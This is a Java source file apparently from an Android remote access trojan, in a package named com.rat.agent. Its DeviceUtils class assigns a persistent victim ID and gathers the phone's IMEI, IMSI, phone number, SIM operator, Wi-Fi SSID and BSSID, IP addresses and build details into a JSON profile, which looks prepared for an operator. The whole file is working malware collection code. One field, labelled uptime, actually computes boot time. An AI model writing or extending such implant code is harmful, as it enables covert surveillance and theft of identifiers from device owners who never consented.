package com.rat.agent;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.location.LocationManager;
import android.location.Location;
import java.net.Inet4Address;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;
import java.util.Enumeration;
import org.json.JSONObject;
import org.json.JSONArray;

public class DeviceUtils {

    private static final String PREFS_NAME = "rat_config";
    private static final String KEY_DEVICE_ID = "device_id";

    public static String getDeviceId(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String id = prefs.getString(KEY_DEVICE_ID, null);
        if (id != null) return id;

        id = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
        if (id == null || id.equals("unknown")) {
            id = Build.SERIAL;
            if (id == null || id.equals("unknown") || id.isEmpty()) {
                id = Build.FINGERPRINT + "-" + System.currentTimeMillis();
            }
        }
        prefs.edit().putString(KEY_DEVICE_ID, id).apply();
        return id;
    }

    public static JSONObject getDeviceInfo(Context ctx) throws Exception {
        JSONObject info = new JSONObject();
        info.put("device_id", getDeviceId(ctx));
        info.put("manufacturer", Build.MANUFACTURER);
        info.put("model", Build.MODEL);
        info.put("product", Build.PRODUCT);
        info.put("device", Build.DEVICE);
        info.put("brand", Build.BRAND);
        info.put("board", Build.BOARD);
        info.put("hardware", Build.HARDWARE);
        info.put("android_version", Build.VERSION.RELEASE);
        info.put("sdk_int", Build.VERSION.SDK_INT);
        info.put("build_id", Build.ID);
        info.put("build_display", Build.DISPLAY);
        info.put("fingerprint", Build.FINGERPRINT);
        info.put("host", Build.HOST);
        info.put("type", Build.TYPE);
        info.put("tags", Build.TAGS);
        info.put("cpu_abi", Build.CPU_ABI);
        if (Build.VERSION.SDK_INT >= 21) {
            String[] abis = Build.SUPPORTED_ABIS;
            if (abis != null && abis.length > 0) {
                info.put("primary_cpu_abi", abis[0]);
            }
        }
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                info.put("phone_type", tm.getPhoneType());
                info.put("network_operator", tm.getNetworkOperatorName());
                info.put("sim_operator", tm.getSimOperatorName());
                String imsi = tm.getSubscriberId();
                if (imsi != null) info.put("imsi", imsi);
                String imei = null;
                if (Build.VERSION.SDK_INT >= 26) {
                    try { imei = tm.getImei(); } catch (Exception ignored) {}
                }
                if (imei == null) {
                    try { imei = tm.getDeviceId(); } catch (Exception ignored) {}
                }
                if (imei != null) info.put("imei", imei);
                info.put("line1", tm.getLine1Number());
                info.put("network_country", tm.getNetworkCountryIso());
                info.put("sim_country", tm.getSimCountryIso());
            }
        } catch (Exception ignored) {}

        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null && wm.isWifiEnabled()) {
                info.put("wifi_ssid", wm.getConnectionInfo().getSSID());
                info.put("wifi_bssid", wm.getConnectionInfo().getBSSID());
                info.put("wifi_ip", intToIp(wm.getConnectionInfo().getIpAddress()));
            }
        } catch (Exception ignored) {}

        info.put("ip_address", getLocalIpAddress());
        info.put("uptime_ms", System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime());
        info.put("total_memory", Runtime.getRuntime().maxMemory());
        info.put("free_memory", Runtime.getRuntime().freeMemory());
        info.put("available_processors", Runtime.getRuntime().availableProcessors());

        return info;
    }

    public static boolean isOnline(Context ctx) {
        try {
            ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            NetworkInfo ni = cm.getActiveNetworkInfo();
            return ni != null && ni.isConnected();
        } catch (Exception e) {
            return false;
        }
    }

    private static String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }

    private static String getLocalIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface iface : interfaces) {
                List<Inet4Address> addrs = Collections.list((Enumeration<Inet4Address>) iface.getInetAddresses());
                for (Inet4Address addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "unknown";
    }
}
